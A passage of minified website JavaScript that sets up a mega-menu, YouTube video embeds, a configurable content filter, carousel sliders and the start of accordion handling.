e,n=t(".megamenu-main-nav > .component-content > ul > li.navigation-item > a"),r=t('.megamenu-submenu-items-container .box[class*="content-"]');window.bpComponents.bpMegaMenu.dropDowns=r.length,window.bpComponents.bpMegaMenu.dropDownsUsed=0,window.bpComponents.bpMegaMenu.dropDownsUnUsed=r.length,window.bpComponents.bpMegaMenu.itemsCount=n.length,window.bpComponents.bpMegaMenu.menuItems=(e={},n.each((function(n,r){var a=t(r),i=slug(a.attr("title")),o=t(".content-".concat(i));a.attr("data-content-class","content-".concat(i)),o.length>0&&(o.get(0).open=function(){t(this).addClass("opened")},o.get(0).close=function(){t(this).removeClass("opened")}),o.length>0&&(window.bpComponents.bpMegaMenu.dropDownsUsed++,window.bpComponents.bpMegaMenu.dropDownsUnUsed--),e[camelize(i)]={original:a.attr("title"),slug:i,contentClass:"content-".concat(i),menuItem:t(r).closest("li").get(0),menuDropDown:o.length>0?o.get(0):null}})),e),window.bpComponents.bpMegaMenu.getContentClasses=function(){var t=window.bpComponents.bpMegaMenu.menuItems;for(var e in t)t.hasOwnProperty(e)&&t[e].hasOwnProperty("contentClass")&&console.log(t[e].contentClass)}})),t(window).resize((function(){t(window).width()>991&&(t(".navigation-mobile-menu").siblings(".navigation-root").removeClass("is-open"),t(".mobile-nav").removeClass("is-open"),t("body").css("position","static"))})),t(".navigation-item-decoration").on("click",(function(e){e.preventDefault(),e.stopImmediatePropagation(),t(e.target).closest("li").toggleClass("is-active is-open")})),t(".navigation-mobile-menu").on("click",(function(e){var n=t(".megamenu-language-list.opened");if(n.length>0)n.removeClass("opened");else{var r=t(".navigation-mobile-menu");t(".megamenu").removeClass("search-opened").toggleClass("nav-opened"),t(".megamenu-main-nav").find(".is-open").removeClass("is-active is-open"),t("body").toggleClass("no-scrolling"),r.toggleClass("opened")}}))}(Cog.jQuery());n(108);!function(t){t(".reference-youtube-video").on("click",(function(e){var n=t(e.currentTarget),r=n.find(".placeholder-img"),a=n.find(".iframe-container"),i=r.width(),o=r.height(),s=decodeURIComponent(a.attr("data-v-src"));a.html('<iframe id="ytplayer" type="text/html" width="'+r.width()+'" height="'+r.height()+'" src="'+s+'?autoplay=1" frameborder="0" allowfullscreen></iframe>'),n.find(".icon-video-play").hide(),a.find("#ytplayer").on("load",(function(){r.css("display","none"),n.find(".iframe-container, iframe").height(o).width(i).css("display","inline-block")}))}))}(Cog.jQuery()),String.prototype.regexIndexOf=function(t,e){var n=this.substring(e||0).search(t);return n>=0?n+(e||0):n},function(t){var e,n=window.localStorage,r=function(t,e){return(void 0===t.attr("aria-labelledby")?"":t.attr("aria-labelledby")).split(" ").concat(e).join(" ").replace(/^ /gi,"")};function a(r){if(!r.keyCode||13===r.keyCode){var a=t(r.target),i=(a.closest(".filter-item-js"),a.is(".default-state-js")),o=a.closest(".class-filter"),s=o.find(".filter-list-js").get(0),c=(o.get(0),o.is('[data-multiselect="true"]')),l=o.is('[data-update-urlhash="true"]'),u=o.data("showResultsInBox"),d=!0===o.data("saveToLocalStorage"),f=o.data("wrapItemWithSelector"),h=o.data("filterClass"),p=o.data("resultsBoxClass")?t(".".concat(o.data("resultsBoxClass")," > .component-content > .paragraphSystem")):null,m=o.data("needsToMeetAllCriteria"),v=o.data("type"),g=(o.data("groupClass"),o.data("isNavigation"));if(o.is('[data-type="sidebar"],[data-type-mobile="sidebar"]')&&a.is(".filter-container-js.opened-js .filter-list-js"))return t(".opened-js").removeClass("opened-js"),void e.css({overflow:""});if(!a.is(".filter-group-label-js, .filter-group-label-js *")&&(o.find(".filter-container-js.opened-js").length<1&&t(".opened-js").removeClass("opened-js"),a.is(".selected-item-js, .selected-item-js *, .filter-item-js, .filter-item-js *")&&(!a.is(".selected-item-js, .selected-item-js *")||((a=a.closest(".selected-item-js")).parent().toggleClass("opened-js"),a.is("[data-type-mobile=dropdown] .selected-item-js, [data-type=dropdown] .selected-item-js, [data-type-mobile=dropdown] .selected-item-js *, [data-type=dropdown] .selected-item-js *")&&t(s).offset().top+s.scrollHeight>t(".container-fluid").get(0).scrollHeight&&t(".container-fluid").css({minHeight:t(s).offset().top+s.scrollHeight-t("body").get(0).scrollHeight+t("body").get(0).scrollHeight}),!a.is("[data-type-mobile=dropdown] .selected-item-js, [data-type=dropdown] .selected-item-js, [data-type-mobile=dropdown] .selected-item-js *, [data-type=dropdown] .selected-item-js *"))))){if(a.is(".filter-redirect .filter-item-js a"))return!0;if(!g)if(r.preventDefault(),a.is(".filter-redirect .filter-item-js, .filter-redirect .filter-item-js *")){a.closest(".filter-container-js").removeClass("opened-js"),a=a.closest(".filter-item-js"),e.css({overflow:""});try{window.location.href=a.data("link")}catch(t){console.warn("Data link is: ".concat(a.data("link"),". And can't be redirected!"))}}else{if("sidebar"!==v||o.find(".filter-list-js").is(".opened-js")||e.css({overflow:"hidden"}),u&&(p.empty(),o.data("elements").hide()),a.is(".filter-item-js, .filter-item-js *")){c&&0===o.find(".filter-item-js.active-js").length&&o.data("elements").hide();var y=(a=a.closest(".filter-item-js")).closest(".filter-container-js");if(c||(y.closest(".class-filter").data("elements").hide(),o.find(".filter-item-js.active-js").removeClass("active-js").attr({"aria-selected":!1})),a.is(".active-js")?(a.removeClass("active-js").attr({"aria-selected":!1}),a.data("data-related-item").hide()):a.is(".active-js")||a.is(".filter-group-label-js")||(a.addClass("active-js").attr({"aria-selected":!0}),u||m||a.data("data-related-item").show()),c||(y.find(".selected-item-js".concat(f)).text(a.text()),a.closest(".filter-container-js").removeClass("opened-js"),e.css({overflow:""})),u||m)if(p.append(t('<a style="visibility:hidden"></a>')),!m&&u)o.find(".filter-item-js.active-js").each((function(e,n){t(n).data("data-related-item").clone(!0).removeData().appendTo(p).show()}));else if(m){var b=[];if(o.find(".filter-item-js.active-js").each((function(e,n){b.push(t(n).data("categoryClass"))})),b.length>0){var w=t("".concat(o.data("dataFilterClass"),".").concat(b.join(".")));u&&w.length>0?w.clone(!0).removeData().appendTo(p).show():u&&0===w.length?p.append(t('<p class="no-results-filter-js">'.concat(o.data("noResultsLabel"),"</p>"))):!u&&w.length>0?(w.show(),t("".concat(o.data("dataFilterClass"),":not(.").concat(b.join("."),")")).hide()):u||0!==w.length||t("".concat(o.data("dataFilterClass"))).hide()}}if(l){var C="";y.find(".filter-item-js.active-js").each((function(e,n){C+="".concat(t(n).attr("data-label-slug"),"|")})),void 0===(C=C.slice(0,-1))||"undefined"===C||""===C?"function"==typeof window.history.replaceState&&history.replaceState({},"",window.location.href.split("#")[0]):window.location.hash=C}c&&0===o.find(".filter-item-js.active-js").length&&(u&&p.empty(),o.data("elements").show()),o.get(0).results={selectedItems:[],selectedGroups:[],selectedGropsSlugified:[],selectedLabels:[],selectedClasses:[],selected:0},y.find(".filter-item-js.active-js").each((function(e,n){try{if(o.get(0).results.selectedItems.push(n),t(n).is("[data-selector]")){o.get(0).results.selected++,o.get(0).results.selectedLabels.push(t(n).attr("data-label"));var r=t(n).attr("data-selector").split(/ ?\./i);r.shift(0),o.get(0).results.selectedClasses=o.get(0).results.selectedClasses.concat(r)}"false"!==t(n).attr("data-filter-group")&&o.get(0).results.selectedGroups.indexOf(t(n).attr("data-filter-group"))<0&&(o.get(0).results.selectedGroups.push(t(n).attr("data-filter-group")),o.get(0).results.selectedGropsSlugified.push(t(n).attr("data-filter-group-slug")))}catch(t){console.warn(t)}}));try{o.get(0).results.selectedClasses.length>0&&o.get(0).results.selectedClasses.push(o.get(0).data.filterClass),o.get(0).results.selectedClasses=o.get(0).results.selectedClasses.unique()}catch(t){}try{o.get(0).getGroupResults()}catch(t){}"function"==typeof o.get(0).onChanged&&o.get(0).onChanged()}if(i&&t(".hide-on-default").hide(),d){var k;k=null===n.getItem("bpFilterLsObject")?{}:JSON.parse(n.getItem("bpFilterLsObject"));var S=o.find(".filter-item-js.active-js");k[h]={},S.length<1?delete k[h]:k[h].preselect=(x=[],S.each((function(e,n){x.push(t(n).index()+1)})),x),n.setItem("bpFilterLsObject",JSON.stringify(k))}var x;c||o.find("*").trigger("blur")}}}}t(document).ready((function(){(e=t("body")).on("click",(function(n){var r=t(n.target);r.is(".filter-container-js, .filter-container-js *")||t(".filter-container-js.opened-js").removeClass("opened-js"),!r.is('[data-type="sidebar"][data-multiselect="true"] .filter-container-js.opened-js .filter-list-js,[data-type-mobile="sidebar"][data-multiselect="true"] .filter-container-js.opened-js .filter-list-js')&&r.is(".filter-container-js, .filter-container-js *")||setTimeout((function(){e.css({overflow:""})}),10)})).on("mouseup",(function(e){t(".filter-item-js, .filter-item-js *").trigger("blur")}));var i=t(".class-filter"),o=[];i.each((function(e,i){var s,c=(new Date).getTime(),l="\n  JV Filter Object:\n  Filter selector: ".concat(".class-filter"),u=t(i),d=u.is(".navigation.component"),f=u.get(0),h=d?t(window).width()>768?function(){try{return u.attr("class").match(/type\-(?!mobile\-)([^ ]+)/i)[1]}catch(t){return"dropdown"}}():function(){try{return u.attr("class").match(/type\-mobile\-([^ ]+)/i)[1]}catch(t){return"dropdown"}}():t(window).width()>768?u.attr("data-type"):u.attr("data-type-mobile"),p=d?null!==u.attr("class").match(/type\-mobile\-([^ ]+)/i)?u.attr("class").match(/type\-mobile\-([^ ]+)/i)[1]:"dropdown":null,m=d?"":u.attr("data-preselect-item"),v="$preselectItemIndex"!==m&&""!==m&&!/[^0-9, ]/gi.test(m)&&m.split(/, ?/gi),g=!(d||"true"!==u.attr("data-force-hide-defaultlabel")&&"false"!==u.attr("data-force-hide-defaultlabel"))&&Function("return ".concat(u.attr("data-force-hide-defaultlabel")))(),y=u.attr("data-default-label"),b="1"===u.attr("data-use-localstorage")||"true"===u.attr("data-use-localstorage"),w=" "===u.attr("data-item-wrap-with")||""===u.attr("data-item-wrap-with")?"":"<".concat(u.attr("data-item-wrap-with"),">"),C=" "===u.attr("data-item-wrap-with")||""===u.attr("data-item-wrap-with")?"":"</".concat(u.attr("data-item-wrap-with"),">"),k=" "===u.attr("data-item-wrap-with")||""===u.attr("data-item-wrap-with")?"":" > ".concat(u.attr("data-item-wrap-with")),S=u.attr("data-categories")||"",x=""!==S&&"$categories"!==S,T=S.split(/, ?/gi),O="links"===h||d?'<a href="#">':"",j="links"===h||d?"</a>":"",E=d||""===u.attr("data-filter-class")||"$fClass"===u.attr("data-filter-class")||void 0===u.attr("data-filter-class")?"noclass":".".concat(u.attr("data-filter-class").replace(/ /gi,"")),M="$filterGroupClass"!==u.attr("data-filter-group-class")&&void 0!==u.attr("data-filter-group-class")&&" "!==u.attr("data-filter-group-class")&&"".concat(u.attr("data-filter-group-class").replace(/ /gi,"")),I=u.attr("data-functionality"),D="true"===u.attr("data-applyadditionalclasstoall"),_="$fAddClass"===u.attr("data-filter-add-class")||""===u.attr("data-filter-add-class")||void 0===u.attr("data-filter-add-class")?[""]:u.attr("data-filter-add-class").split(/, ?/gi).join(" "),N="$categoriesAddClasses"===u.attr("data-categories-add-classes")||""===u.attr("data-categories-add-classes")||void 0===u.attr("data-categories-add-classes")?[]:u.attr("data-categories-add-classes").split(/, ?/gi),F="$urllabels"===u.attr("data-url-labels")||""===u.attr("data-url-labels")||void 0===u.attr("data-url-labels")?[]:u.attr("data-url-labels").split(/, ?/gi),A="$urllabels"===u.attr("data-urls")||""===u.attr("data-urls")||void 0===u.attr("data-urls")?[]:u.attr("data-urls").split(/, ?/gi),L="$showResultsInBox"!==u.attr("data-results-in-box")&&""!==u.attr("data-results-in-box")&&void 0!==u.attr("data-results-in-box")&&Function("return ".concat(u.attr("data-results-in-box")))(),P="$resultsBoxClass"!==u.attr("data-resluts-box-class")&&""!==u.attr("data-resluts-box-class")&&void 0!==u.attr("data-resluts-box-class")&&u.attr("data-resluts-box-class"),V=("$dataOnChanged"===u.attr("data-onchanged")||u.attr("data-onchanged"),"$dataOnFinished"===u.attr("data-onfinished")||u.attr("data-onfinished"),"$dataOnReady"===u.attr("data-onready")||u.attr("data-onready"),"$needsToMeetAllCriteria"!==u.attr("data-meet-all-criteria")&&""!==u.attr("data-meet-all-criteria")&&void 0!==u.attr("data-meet-all-criteria")&&Function("return ".concat(u.attr("data-meet-all-criteria")))()),R="$noResultsLabel"===u.attr("data-no-results-label")||""===u.attr("data-no-results-label")||void 0===u.attr("data-no-results-label")?"No results":u.attr("data-no-results-label");u.data({showResultsInBox:L,resultsBoxClass:P,needsToMeetAllCriteria:V,noResultsLabel:R,dataFilterClass:E,saveToLocalStorage:b,filterClass:E.replace(/\./gi,""),groupClass:M,isNavigation:d,wrapItemWithSelector:k}).addClass(M),M?(f.grouped=!0,f.getGroupResults=function(){var e=this,n=[];return this.groupResults={},this.data.filterGroupClass&&t(".".concat(this.data.filterGroupClass)).each((function(t,r){e.groupResults[r.id]=r.getResults(),n=n.concat(e.groupResults[r.id].selectedClasses)})),this.groupResults.selectedGroupClasses=n.unique(),this.groupResults}):f.grouped=!1,f.onChanged=function(){try{Function("".concat(f.data.onchanged)).call(f,null)}catch(t){u.is(".debug ".concat(".class-filter"))&&console.log(t)}},f.onFinished=function(){try{Function("".concat(f.data.onfinished)).call(f,null)}catch(t){u.is(".debug ".concat(".class-filter"))&&console.log(t)}},f.onReady=function(){try{Function("".concat(f.data.onready)).call(f,null)}catch(t){u.is(".debug ".concat(".class-filter"))&&console.log(t)}},l="".concat(l,"\n  Type: ").concat(h,"\n  Functionality: ").concat(I,"\n  Preselect: ").concat(v,"\n  Hide default label: ").concat(g,"\n  Default label: ").concat(y,"\n  Has categories: ").concat(x,"\n  Categories: ").concat(T,"\n  Filtered global class: ").concat(E,"\n  Filter grooup class: ").concat(M,"\n  Filter grouped: ").concat(u.get(0).grouped,"\n  Filter custom class: ").concat(_,"\n  Filter items custom classes: ").concat((s="",N.forEach((function(t,e){var n=void 0===T[e]||"$categories"===T[e]?"Item ".concat(e+1):T[e];s="".concat(s,"\n            ").concat(n,": .").concat(t.split(/\. ?/).join(" ."))})),s),"\n  URLs: ").concat(function(t){var e="";return F.forEach((function(t,n){A[n]&&(e="".concat(e,"\n          ").concat(t,": ").concat(A[n]))})),e}());var z=[];if(t(v).each((function(t,e){return v[t]=parseInt(e)})),"filter"===I&&E||d){x&&T.forEach((function(t,e){var n=t.split("."),r=n[1].split("+"),a=r[0],i=r[1];T[e]={label:n[0],selector:".".concat(a),group:void 0!==i&&"".concat(i),groupSlug:void 0!==i&&slug(i)}}),T);var q=t(E),H="function"==typeof _.split?_.split(/, ?| /gi):_,$="string"==typeof H[0]&&" "!==H[0]&&H[0].length>1&&H[0];u.data("elements",q),f.elements=q,u.data("label-selector",u.attr("data-label-selector")),f.labelSelector="$labelSelector"!==u.attr("data-label-selector")&&" "!==u.attr("data-label-selector")&&""!==u.attr("data-label-selector")&&u.attr("data-label-selector"),f.id="filter".concat(camelize(d?"navigation-filter":$||"".concat((1e13*Math.random()).toFixed(0)))).concat(d?(1e13*Math.random()).toFixed(0):""),f.getResults=function(t){return t||(f.results=void 0===f.results?{selectedItems:[],selectedGroups:[],selectedGropsSlugified:[],selectedLabels:[],selectedClasses:[],selected:0}:f.results),f.results};var U,Z,W=u.is('[data-multiselect="true"]');if(d){window.filterNavDefaultLabel=window.filterNavDefaultLabel?window.filterNavDefaultLabel:"Please select",U=u.find("> .component-content").addClass("filter-container-js");var G=(Z=u.find("> .component-content > ul").addClass("filter-list-js")).find("ul");G.length>0&&G.each((function(e,n){var r=t(n),a=r.closest("li"),i=r.find("li");a.addClass("group-label-js multilevel"),i.addClass("filter-item-js")})),t('<div class="selected-item-js">'.concat(w).concat(window.filterNavDefaultLabel).concat(C,"</div>")).prependTo(U)}else U=t('<div class="filter-container-js '.concat(_,'"></div>')),t('<div class="selected-item-js">'.concat(w).concat(y).concat(C,"</div>")).appendTo(U),Z=t('<ul class="filter-list-js"></ul>').appendTo(U);W||g||d||t('<li class="filter-item-js default-state-js active-js" aria-selected="false">'.concat(w).concat(O).concat(y).concat(j).concat(C,"</li>")).data("data-related-item",q).appendTo(Z);var B=decodeURIComponent(window.location.hash).replace("#","").split("|");x?T.forEach((function(e,n){var a=!1,i=e.selector,o=i.substr(1),s=e.label,c=e.group,l=e.groupSlug,u=t(i),d=[];u.each((function(t,n){""===n.id&&(n.id="filteredItem".concat(1e17*Math.random()).concat((new Date).getTime())),d.push(e.id)})),u.not(E)&&(u=t(i).closest(E));var f=window.slug(s),h="";N.length>0&&void 0!==N[n]&&(h=N[n].split(/\. ?/gi).join(" ")),D&&u.addClass(h),u.not(E)&&(u=t(i).closest(E),D&&u.addClass(h));var p,m="filterItem".concat(1e17*Math.random()).concat((new Date).getTime()),g=t('<li class="filter-item-js '.concat(o," ").concat(h,'" aria-selected="false">').concat(w).concat(O).concat(s).concat(j).concat(C,"</li>")).data({"data-related-item":u,categoryClass:o}).attr({"data-label":s,"aria-label":"Click this to select or deselect option '".concat(s,"'"),"aria-controls":d.join(" "),"data-label-slug":f,"data-filter-group":c,"data-filter-group-slug":l,"data-selector":i,id:m});u.each((function(e,n){var a=t(n);a.attr({"aria-labelledby":r(a,m)})})),B.indexOf(f)>-1&&(a=!0),u.attr("data-label-slug",f),(a&&!V||v&&v.indexOf(n+1)>-1&&!V&&!a||V&&a)&&z.push(g),c&&Z.find('.filter-group-label-js[data-filter-group="'.concat(c,'"]')).length<1&&(p="filterGroup".concat((new Date).getTime()),t('<li id="'.concat(p,'" class="filter-item-js filter-group-label-js" data-filter-group="').concat(c,'" data-filter-group-slug="').concat(l,'">').concat(w).concat(c).concat(C,"</li>")).appendTo(Z)),c?Z.find('[data-filter-group="'.concat(c,'"]:last')).after(g.attr({"aria-describedby":p})):g.appendTo(Z)})):d?(u.attr({"data-type":h,"data-type-mobile":p}).find("> .component-content > ul > li").addClass("filter-item-js"),u.find("li.is-active").addClass("active-js")):q.each((function(e,n){var a=!1,i=t(n),o=[];i.each((function(t,e){""===e.id&&(e.id="filteredItem".concat(1e17*Math.random()).concat((new Date).getTime())),o.push(e.id)}));var s=u.data("label-selector"),c=i.find(s).text(),l=window.slug(c),d=(B.indexOf(l),"filterItem".concat(1e17*Math.random()).concat((new Date).getTime())),f=t('<li class="filter-item-js" aria-selected="false">'.concat(w).concat(O).concat(c).concat(j).concat(C,"</li>")).data("data-related-item",i).attr({"data-label":c,"aria-label":c,"aria-controls":o.join(" "),"data-label-slug":l,id:d});i.each((function(e,n){var a=t(n);a.attr({"aria-labelledby":r(a,d)})})),B.indexOf(l)>-1&&(a=globalHashMatchFound=!0),i.attr("data-label-slug",l),(a&&!V||v&&v.indexOf(e+1)>-1&&!V&&!a||V&&a)&&z.push(f),f.appendTo(Z)})),U.appendTo(u),u.on("click keyup",a)}else if("redirect"===I){var J=t('<div class="filter-container-js filter-redirect '.concat(_,'"></div>'));t('<div class="selected-item-js">'.concat(w).concat(y).concat(C,"</div>")).appendTo(J);var Y=t('<ul class="filter-list-js"></ul>').appendTo(J);F.forEach((function(e,n){var r="",a="links"===h?'<a href="'.concat(A[n],'">'):"",i="links"===h?"</a>":"";N.length>0&&void 0!==N[n]&&(r=N[n].split(/\. ?/gi).join(" ")),t('<li class="filter-item-js '.concat(r,'">').concat(w).concat(a).concat(e).concat(i).concat(C,"</li>")).data("link",A[n]).attr({"data-label":e,"data-label-slug":window.slug(e)}).appendTo(Y)})),J.appendTo(u),u.on("click",a),(0===v[0]||d)&&setTimeout((function(){u.find(".default-state-js").trigger("click")}),1)}t(z).each((function(t,e){e.trigger("click")}));var Q=(new Date).getTime(),K=new Date(Q-c).getMilliseconds();if(l="".concat(l,"\n  Filter creation time: ").concat(K,"ms\n  "),u.is(".debug ".concat(".class-filter"))&&t(document.createComment(l)).prependTo(u),null!==n.getItem("bpFilterLsObject")){var X,tt,et=JSON.parse(n.getItem("bpFilterLsObject"));et.hasOwnProperty(u.data("filterClass"))&&(tt=et[u.data("filterClass")],X=tt.preselect,u.find(".filter-item-js").each((function(e,n){var r=t(n);X.indexOf(e+1)>-1?(r.is(".active-js")&&r.removeClass("active-js").attr({"aria-selected":!1}),setTimeout((function(){r.trigger("click")}),10)):r.is(".active-js")||r.is(".filter-group-label-js")||r.removeClass("active-js").attr({"aria-selected":!0})})),delete et[u.data("filterClass")],!1===u.data("keepLocalStorageData")&&n.setItem("bpFilterLsObject",JSON.stringify(et)))}f.data=u.data(),f.open=function(){t(this).find(".filter-container-js").addClass("opened-js")},f.close=function(){t(this).find(".filter-container-js").removeClass("opened-js")},f.select=function(e){var n=t(this).find(".filter-list-js .filter-item-js");Array.isArray(e)||"string"!=typeof e||(e=e.split(/, ?/gi)),t(e).each((function(t,e){isNaN(e)||n.eq(parseInt(e)).trigger("click")}))},f.clear=function(){var e=t(this),n=e.find(".filter-list-js .filter-item-js.active-js"),r=this.data.multiselect;!this.results.selected||this.results.selected<1||(r||e.attr("data-multiselect","true"),n.trigger("click"),r||e.attr("data-multiselect","false"))},f.getRelatedFilters=function(){if(!this.data.groupClass)return[];var t=[];for(var e in window.bpComponents.bpFilters)window.bpComponents.bpFilters.hasOwnProperty(e)&&window.bpComponents.bpFilters[e].data.groupClass===this.data.groupClass&&this!==window.bpComponents.bpFilters[e]&&t.push(window.bpComponents.bpFilters[e]);return t},f.items=t(f).find(".filter-list-js > .filter-item-js").get(),f.containerHeight=function(){try{return t(f).find(".filter-list-js").get(0).scrollHeight+t(f).find(".filter-container-js").height()}catch(t){return 0}}(),setTimeout((function(){f.carousel=function(e){var n=e.closest(".carousel-slides"),r=n.find(".carousel-slide"),a=e.closest(".carousel-slide").get(0),i=r.index(a);for(var o in window.bpComponents.bpCarousels)if(t(window.bpComponents.bpCarousels[o]).is(n))return{parentCarousel:window.bpComponents.bpCarousels[o],hasCarousel:!0,currentSlide:a,carouselSlides:r,placementIndex:i};return{parentCarousel:null,hasCarousel:!1,currentSlide:null,carouselSlides:null,placementIndex:-1}}(u)}),1),window.bpComponents.bpFilters[f.id]=f,u.addClass("initiated"),setTimeout((function(){t("body").trigger("click")}),10);setTimeout((function(){!function t(e){if("function"==typeof e.getResults){e.getResults();try{e.getGroupResults()}catch(t){}e.onReady.apply(e,null)}else setTimeout((function(){t(e)}),1)}(f)}),1),f.grouped&&o.push(f.data.groupClass)}));try{if(o.length>0){var s={};o=o.unique(),t(o).each((function(e,n){var r=t(".".concat(n));r.get(0).getGroupResults(),s[camelize(n)]=r})),bpComponents.bpFilters.bpFilterGroups=s}}catch(t){console.warn(t)}})),t("body").on("transitionend",(function(e){var n=t(e.target);if(n.is(".filter-list-js")){var r=n.closest(".class-filter").get(0);if(r.carousel.hasCarousel){var a=r.carousel.parentCarousel,i=r.carousel.placementIndex;a.goToSlide(i)}"function"==typeof r.onFinished&&t(r).find(".filter-container-js.opened-js").length<1&&"transform"===e.originalEvent.propertyName&&r.onFinished()}}))}(Cog.jQuery());n(109);!function(t){function e(t){var e=!t||0===arguments.length;if((this!==window||!e)&&(e&&(t=this),t)){var n=t.find(".carousel-slide.active > .carouselSlide"),r=n.prop("scrollHeight"),a=t.data("config");try{"fade"===a.mode?t.css({"min-height":"auto","padding-bottom":r}):t.css({"min-height":"auto",height:r})}catch(t){}}}t(document).ready((function(n){t(".carousel-configurator").each((function(n,r){var a=t(r),i=a.attr("data-carousel-class");if(""!==i&&void 0!==i&&"$carouselClass"!==i){var o="$carouselClass,$carouselType,$slidesPerMove,$slidesPerMoveMobile,$slideMargin,$slideMarginMobile,$addClass,$mode,$speed,$auto,$pauseOnHover,$slideEndAnimation,$sliderPause,$keyPress,$controls,$controlsMobile,$pager,$pagerMobile,$prevHtml,$nextHtml,$rtl,$adaptiveHeight,$vertical,$verticalHeight,$vThumbWidth,$thumbItem,$thumbItemMobile,$galleryMargin,$galleryMarginMobile,$thumbMargin,$thumbMarginMobile,$currentPagerPosition,$currentPagerPositionMobile,$enableTouch,$enableDrag,$freeMove,$restrictNavigationsContentWidth".split(","),s={},c=a.get(0).attributes;o.forEach((function(t,e){var n=t;for(var r in c)c[r].value&&c[r].value===n&&(c[r].value="")}));var l=!1;try{"true"!=a.attr("data-slider-restrict-navigations-content-width")&&"false"!=a.attr("data-slider-restrict-navigations-content-width")||(l=Function("return ".concat(a.attr("data-slider-restrict-navigations-content-width")))())}catch(t){}for(var u in c){var d=c[u].name;void 0!==d&&/data-/gi.test(d)&&("data-slider-pause-"!==d?s[camelize(d.replace(/slider\-|data\-/gi,""),"-")]=c[u].value:s.sliderPause=c[u].value)}var f={item:parseInt(s.items),autoWidth:!1,slideMove:parseInt(s.perMove),slideMargin:parseInt(s.margin),addClass:s.addClass,mode:s.mode,useCSS:!0,cssEasing:"ease",easing:"linear",speed:parseInt(s.animationSpeed),auto:Function("return ".concat(s.autoplay))(),pauseOnHover:Function("return ".concat(s.pauseOnHover))(),loop:Function("return ".concat(s.loop))(),slideEndAnimation:Function("return ".concat(s.endAnimation))(),pause:parseInt(s.sliderPause),keyPress:Function("return ".concat(s.enableKeypress))(),controls:Function("return ".concat(s.enablePrevnext))(),prevHtml:"",nextHtml:"",rtl:"rtl"===window.getComputedStyle(document.body,null).direction,adaptiveHeight:Function("return ".concat(s.adaptiveHeight))(),vertical:Function("return ".concat(s.enableVertical))(),verticalHeight:parseInt(s.verticalHeight),pager:Function("return ".concat(s.enablePager))(),enableTouch:Function("return ".concat(s.enableTouch))(),enableDrag:Function("return ".concat(s.enableDrag))(),freeMove:Function("return ".concat(s.enableFreeMove))(),swipeThreshold:40,responsive:[{breakpoint:768,settings:{item:parseInt(s.itemsMobile),slideMove:parseInt(s.perMoveMobile),slideMargin:parseInt(s.marginMobile),controls:Function("return ".concat(s.enablePrevnextMobile))(),pager:Function("return ".concat(s.enablePagerMobile))()}}],onBeforeStart:function(t){},onSliderLoad:function(n){!window.carousels&&(window.carousels=[]),window.carousels.push(n),e(n),t(window).resize((function(){e(n)})),t(".".concat(s.carouselClass)).attr("data-restrict-nav-max-width",l),"commonQuestions"===s.carouselType&&(n.find(".common-question-slide .cq-box").removeClass("active"),t(".".concat(s.carouselClass)).on("click",(function(e){var n=t(e.target);n.is(t(".".concat(s.carouselClass," .cq-box, .").concat(s.carouselClass," .cq-box *")))&&(n=n.closest(".cq-box")).toggleClass("active")}))),t(".".concat(s.carouselClass)).addClass("".concat(s.pagerPosition," ").concat(s.pagerMobile," initialized"))},onBeforeSlide:function(t,n){setTimeout(e,parseInt(s.animationSpeed),t)},onAfterSlide:function(t,e){},onBeforeNextSlide:function(t,e){},onBeforePrevSlide:function(t,e){}};if("commonQuestions"===s.carouselType){var h=t(".".concat(s.carouselClass," .cq-box")),p=t(".".concat(s.carouselClass," .cq-box > .component-content > .paragraphSystem")),m=h.find(".cq-text");m.css("max-height","none"),setTimeout((function(){var t=[];p.each((function(e,n){t.push(n.scrollHeight)})),h.css("height",t.sort().reverse()[0]),m.css("max-height","")}),100),t(".".concat(s.carouselClass," .carousel-slide")).addClass("common-question-slide")}var v=t(".".concat(s.carouselClass," .carouselSlide"));if(f.vertical){t(".".concat(s.carouselClass," .carousel-slides")).eq(0).addClass("carousel-vertical");var g=[];v.each((function(t,e){g.push(e.scrollHeight)})),f.verticalHeight=g.sort().reverse()[0]}var y=t(".".concat(s.carouselClass," .carousel-slides")).eq(0).data({config:f}).lightSlider(f),b=y.closest(".carousel"),w=b.attr("class").match(/idclass\-([^\s]+)/gi),C=null!==w?camelize(w[0].replace("idclass-","")):null;b.removeClass((function(t,e){return(e.match(/idclass\-([^\s]+)/gi)||[]).join(" ")})),C=null!==C?C:"carousel".concat((1e12*Math.random()).toFixed(0)).concat((new Date).getTime()),y.attr("id",C),y.updateSliderHeight=e,window.bpComponents.bpCarousels[C]=y}}))}))}(Cog.jQuery()),function(t){t(document).ready((function(e){t(".youtube-player").each((function(e,n){var r,a,i,o,s=t(n),c=s.attr("data-id"),l=s.attr("data-title"),u=t("<div/>").attr({"data-id":c,"data-title":l}).html((r=s.attr("data-id"),a=s.attr("data-img"),i=s.attr("data-alt"),o='<div class="play"></div>',"$yt_placeholder_img"==a?'<img src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="ALT">'.replace("ID",r).replace("ALT",i)+o:'<img src="ID" alt="ALT">'.replace("ID",a).replace("ALT",i)+o)).appendTo(s).on("click",(function(e){var n,r,a,i;n=l,r=s,a=u,i="https://www.youtube.com/embed/".concat(c,"?autoplay=1"),t('<iframe frameborder="0" allowfullscreen="1" src="'.concat(i,'" title="').concat(n,'"></iframe>')).appendTo(r),t(a).remove()}))}))}))}(Cog.jQuery());n(110);function g(t){return(g="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t})(t)}!function(t){var e=function(e){var n=decodeURIComponent(window.location.hash).replace("#","");t(".accordion-title-text").each((function(e,r){var a,i,o=t(r);slug(o.text())===n&&(a=o.closest(".accordion-head"),i=a.offset().top-t(".megamenu-main-nav").height(),setTimeout((function(){t("html").stop(!0,!0,!0).animate({scrollTop:i},"slow","swing",(function(){a.closest(".accordion-slide").addClass("is-active")}))}),1e3))}))};t(document).ready((function(){t('.accordion, .accordion[class*="idclass-"]').each((function(e,n){try{var r=t(n),a=r.find(".accordion-slide"),i=r.is('[class*="idclass-"]')?camelize(r.attr("class").match(/idclass\-([^\s]+)/gi)[0].replace("idclass-","")):generateID("accordion");window.bpComponents.accordions[i]||(window.bpComponents.accordions[i]=n),n.slides={},n.slidesCount=0,a.each((function(e,r){var a=t(r).find(".accordion-head 